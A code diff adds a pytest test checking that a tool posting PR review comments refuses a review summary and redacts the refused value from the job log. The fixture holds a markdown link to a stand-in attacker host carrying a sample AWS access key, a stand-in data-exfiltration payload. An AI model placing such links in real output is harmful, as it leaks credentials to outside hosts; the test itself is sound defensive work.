@@ -581,6 +581,26 @@ class TestMain:
             post.main()
         assert posted == []
 
+    def test_a_rejection_reaching_the_job_log_is_redacted(
+        self, main_env, monkeypatch, artifact_dir, capsys
+    ):
+        # The message interpolates the value it refused, and this executor holds
+        # the policy, so the redaction belongs here rather than in
+        # github_api.fail — that module imports only stdlib and is shared with
+        # prepare_context, so it has no policy to redact against.
+        bad = json.loads((artifact_dir / "review.json").read_text())
+        bad["summary"] = "see [d](http://logs.evil/?k=AKIAIOSFODNN7EXAMPLE)"
+        (artifact_dir / "review.json").write_text(json.dumps(bad))
+        stub_pr_shas(monkeypatch, UNMOVED)
+        monkeypatch.setattr(post, "upsert_comment", lambda *a, **k: None)
+
+        with pytest.raises(SystemExit):
+            post.main()
+
+        err = capsys.readouterr().err
+        assert "artifact rejected" in err
+        assert "AKIAIOSFODNN7EXAMPLE" not in err
+
     def test_head_moved_posts_nothing(self, main_env, monkeypatch):
         # TOCTOU guard: head advanced since the review ran.
         stub_pr_shas(monkeypatch, ("different-sha", "main"))
